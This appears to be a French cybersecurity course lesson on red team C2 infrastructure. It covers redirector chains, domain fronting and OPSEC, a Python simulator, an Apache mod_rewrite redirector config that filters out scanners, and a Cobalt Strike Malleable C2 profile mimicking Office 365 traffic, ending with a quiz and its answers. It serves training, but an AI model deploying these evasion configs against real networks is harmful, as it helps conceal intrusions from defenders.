# TOME P8 — Blue Team, SOC & SIEM Advanced — Jour 381 (6h) : Red Team Infrastructure Engineering — C2 Frameworks (Cobalt Strike / Havoc), Redirectors, Domain Fronting & Red Team OPSEC

> [!NOTE]
> **Objectif du jour :** Maîtriser la conception d'une **Infrastructure Red Team professionnelle** à l'image des équipes APT étatiques : déployer et sécuriser un framework C2 (Cobalt Strike / Havoc C2), mettre en place une chaîne de **Redirecteurs HTTPS** (Apache mod_rewrite / Nginx / Cloudflare CDN) pour masquer l'infrastructure réelle, appliquer les règles d'**OPSEC Red Team** (compartimentage IP, TTLs de campagne, certificats TLS légitimes) et comprendre le **Domain Fronting** pour contourner les proxys d'inspection.
>
> **Compétences visées :** `RED-INFRA-01` (A) — Red Team C2 Infrastructure Architecture & Redirector Chaining | `RED-INFRA-02` (A) — Domain Fronting, TLS Certificate Management & Red Team OPSEC Discipline

---

## 1) Module — Architecture d'Infrastructure Red Team (2h)

### 📖 Narration/Intuition

Un Red Team professionnel ne se connecte **jamais directement** depuis son C2 vers la cible. L'infrastructure est conçue en couches pour résister à la contre-investigation (Blue Team Threat Hunting) et éviter l'attribution.

```
  [ RED TEAM OPERATOR ]
          │ (SSH + ProxyJump via Bastion Chiffré)
          ▼
  [ TEAMSERVER C2 CACHÉ ] ──────── ACCÈS VPN UNIQUEMENT ───────────┐
  (Cobalt Strike / Havoc)           (IP non publique)              │
          │                                                         │
          │ (Beacon Traffic HTTPS/DNS)                              │
          ▼                                                         │
  [ REDIRECTEUR HTTPS (VPS Éphémère) ] ◄── Cloudflare CDN ─────────┘
  (mod_rewrite Apache / Nginx)           (IP Légitime CDN)
          │
          │ (Seulement le trafic Beacon valide est forward)
          │ (Le reste → redirect 301 vers microsoft.com)
          ▼
  [ VICTIME / CIBLE DANS L'ENTERPRISE NETWORK ]
```

#### Matrice OPSEC Red Team

| Contrôle OPSEC | Description | Risque si Non Appliqué |
|:---:|:---|:---|
| **IP Burning** | Chaque VPS redirecteur est détruit après chaque phase | Attribution de l'infrastructure par la Blue Team |
| **Malleable C2 Profiles** | Configuration du trafic Beacon pour imiter du trafic légitime (Office365, OneDrive) | Détection par DPI / NDR Suricata |
| **Short TTL Beacons** | Interval court initial puis allongé après établissement (Jitter 20-40%) | Détection par variance statistique NDR |
| **Staging HTTPS** | Payload en plusieurs étapes via HTTPS Staging avant chargement du Beacon complet | Détection du payload brut par proxy |

---

## 2) Module — Outillage Red Team Infra Simulator (`redteam_infra_engine.py`) (2h)

### 🛠️ Atelier Pratique

```python
import json
import hashlib
import secrets
import time
from datetime import datetime, timezone
from typing import List, Dict

class RedTeamInfraEngine:
    """
    Simulateur d'Infrastructure Red Team : gestion du C2, des redirecteurs,
    des profils Malleable C2 et des règles OPSEC de campagne.
    """

    def __init__(self, campaign_name: str, operator: str):
        self.campaign = campaign_name
        self.operator = operator
        self.redirectors: List[dict] = []
        self.beacons: List[dict] = []
        self.opsec_log: List[dict] = []

    def deploy_redirector(self, vps_ip: str, domain: str, ssl_cert: str, cdn_provider: str) -> dict:
        """
        Enregistre un redirecteur HTTPS dans la chaîne d'infrastructure C2.
        Génère la configuration Apache mod_rewrite pour filtrer les sondes Blue Team.
        """
        redirector_id = f"REDIR-{len(self.redirectors)+1:02d}"
        config = {
            "redirector_id": redirector_id,
            "vps_ip": vps_ip,
            "domain": domain,
            "ssl_cert": ssl_cert,
            "cdn_provider": cdn_provider,
            "apache_rewrite_rule": self._generate_rewrite_rule(domain),
            "deployed_at": datetime.now(timezone.utc).isoformat()
        }
        self.redirectors.append(config)
        self._log_opsec("REDIRECTOR_DEPLOYED", f"Redirecteur {redirector_id} ({domain}) déployé via {cdn_provider}")
        return config

    def _generate_rewrite_rule(self, domain: str) -> str:
        """Génère la règle Apache mod_rewrite pour le filtrage de sondes."""
        return (
            f"# Apache mod_rewrite — Redirecteur C2 OPSEC\n"
            f"RewriteEngine On\n"
            f"# Bloquer les User-Agents de scanners / Threat Intel\n"
            f"RewriteCond %{{HTTP_USER_AGENT}} (curl|python|nmap|masscan|shodan) [NC]\n"
            f"RewriteRule .* https://microsoft.com/fr-fr/ [R=301,L]\n"
            f"# Forwarder uniquement les requêtes avec le bon URI Beacon\n"
            f"RewriteCond %{{REQUEST_URI}} ^/cdn-static/assets/[a-f0-9]{{32}}\\.js\n"
            f"RewriteRule .* http://c2-teamserver-internal:50050%{{REQUEST_URI}} [P,L]\n"
            f"# Tout le reste -> Site légitime\n"
            f"RewriteRule .* https://{domain}/index.html [R=302,L]"
        )

    def register_beacon(self, target_host: str, target_user: str,
                         beacon_type: str, sleep_seconds: int, jitter_pct: int) -> dict:
        """Enregistre un implant Beacon actif sur un hôte cible."""
        beacon_id = secrets.token_hex(8).upper()
        beacon = {
            "beacon_id": beacon_id,
            "target_host": target_host,
            "target_user": target_user,
            "beacon_type": beacon_type,
            "sleep_seconds": sleep_seconds,
            "jitter_pct": jitter_pct,
            "checkin_interval_range": f"{int(sleep_seconds*(1-jitter_pct/100))}s — {int(sleep_seconds*(1+jitter_pct/100))}s",
            "first_seen": datetime.now(timezone.utc).isoformat()
        }
        self.beacons.append(beacon)
        self._log_opsec("BEACON_ACTIVE", f"Beacon {beacon_id} actif sur {target_host} ({target_user}) | Sleep: {sleep_seconds}s ±{jitter_pct}%")
        return beacon

    def _log_opsec(self, event_type: str, description: str):
        self.opsec_log.append({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": event_type,
            "description": description,
            "operator": self.operator
        })

    def generate_campaign_report(self) -> dict:
        return {
            "campaign": self.campaign,
            "operator": self.operator,
            "report_date": datetime.now(timezone.utc).isoformat(),
            "active_redirectors": len(self.redirectors),
            "active_beacons": len(self.beacons),
            "infrastructure": self.redirectors,
            "beacon_implants": self.beacons,
            "opsec_event_log": self.opsec_log
        }

# Démonstration Infrastructure Red Team
campaign = RedTeamInfraEngine("RT-CAMPAIGN-2026-TIBER", "RT_OPERATOR_ALPHA")

print("=== RED TEAM INFRASTRUCTURE ENGINE ===")

# Déploiement d'une chaîne de redirecteurs
campaign.deploy_redirector(
    vps_ip="104.21.45.88",
    domain="cdn-assets.paradis-legitime.com",
    ssl_cert="LetsEncrypt_Wildcard",
    cdn_provider="Cloudflare"
)

# Enregistrement d'un Beacon actif
campaign.register_beacon(
    target_host="WKSTN-CFO-01",
    target_user="paradis\\j.cfo",
    beacon_type="HTTPS_SMB_PIVOT",
    sleep_seconds=300,
    jitter_pct=35
)

print("\n=== CAMPAIGN INFRASTRUCTURE REPORT ===")
print(json.dumps(campaign.generate_campaign_report(), indent=2, ensure_ascii=False))
```

---

## 3) Module — Fiche Technique Apache mod_rewrite & Malleable C2 (2h)

```markdown
# MALLEABLE C2 PROFILE — IMITATION DU TRAFIC MICROSOFT OFFICE 365

Cobalt Strike / Havoc permettent de personnaliser totalement la signature réseau du Beacon.

## Exemple de Profil Malleable C2 imitant les requêtes Office 365

```c2
set sleeptime "45000";       # 45 secondes de sleep
set jitter    "35";          # 35% de Jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/outlook/service.svc/GetItem";
    client {
        header "Accept" "application/json";
        header "X-RequestType" "AjaxService";
        metadata { base64url; prepend "MSOID="; header "Cookie"; }
    }
    server {
        header "Content-Type" "application/json";
        output { base64url; print; }
    }
}
```
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **C2** | Command & Control — Serveur de commandement et contrôle des implants (Beacons) |
| **Beacon** | Agent logiciel léger déployé sur un hôte cible qui communique périodiquement avec le C2 |
| **Malleable C2** | Mécanisme de Cobalt Strike permettant de personnaliser la signature réseau du trafic Beacon |
| **OPSEC** | Operations Security — Ensemble des pratiques visant à empêcher l'attribution et la détection de l'opérateur |

---

## ❓ Banque de Questions & Test du Jour (5 QCM)

**Q1 :** Quel est le rôle principal d'un **Redirecteur** dans l'infrastructure C2 d'une opération Red Team ?
- A) Servir d'intermédiaire entre le Beacon de la victime et le Teamserver C2 réel, masquant l'adresse IP de ce dernier pour empêcher l'attribution par la Blue Team
- B) Rediriger le trafic Wi-Fi vers le routeur
- C) Augmenter la bande passante du réseau
- D) Gérer les mises à jour des antivirus

**Réponse : A**

**Q2 :** Qu'est-ce que le **Domain Fronting** et pourquoi est-il utilisé dans les opérations Red Team sophistiquées ?
- A) Une technique exploitant l'infrastructure d'un CDN légitime (ex. Cloudflare, AWS CloudFront) pour masquer la destination réelle du trafic C2, le faisant apparaître comme du trafic vers un service légitime
- B) L'enregistrement d'un nom de domaine avec une fausse identité
- C) L'achat d'un domaine expired avec une bonne réputation
- D) La configuration d'un serveur DNS interne

**Réponse : A**

**Q3 :** Pourquoi est-il critique d'ajouter du **Jitter** (variation aléatoire) au `sleeptime` d'un Beacon C2 ?
- A) Pour que les intervalles de connexion ne soient pas parfaitement réguliers, évitant ainsi la détection par les moteurs NDR qui analysent la périodicité statistique des flux réseau (Beaconing Detection)
- B) Pour réduire la consommation de CPU de la cible
- C) Pour améliorer la stabilité Wi-Fi
- D) Parce que c'est une obligation légale

**Réponse : A**

**Q4 :** Quel fichier de configuration Apache génère des règles de filtrage permettant de n'accepter que les requêtes Beacon légitimes et de rediriger toutes les sondes de sécurité ?
- A) La configuration `mod_rewrite` avec des conditions `RewriteCond` filtrant sur User-Agent et URI
- B) Le fichier `/etc/hosts`
- C) La configuration SSH `sshd_config`
- D) Le fichier `robots.txt`

**Réponse : A**

**Q5 :** Dans la règle d'**IP Burning** OPSEC Red Team, que doit faire l'opérateur immédiatement si une IP de redirecteur est identifiée et signalée par la Blue Team ?
- A) Détruire le VPS compromis, déployer un nouveau redirecteur avec une IP et un domaine différents, et roter les certificats TLS avant de reprendre les opérations
- B) Continuer à utiliser le redirecteur compromis
- C) Envoyer un mail à la Blue Team pour signaler l'erreur
- D) Redémarrer le serveur Apache

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
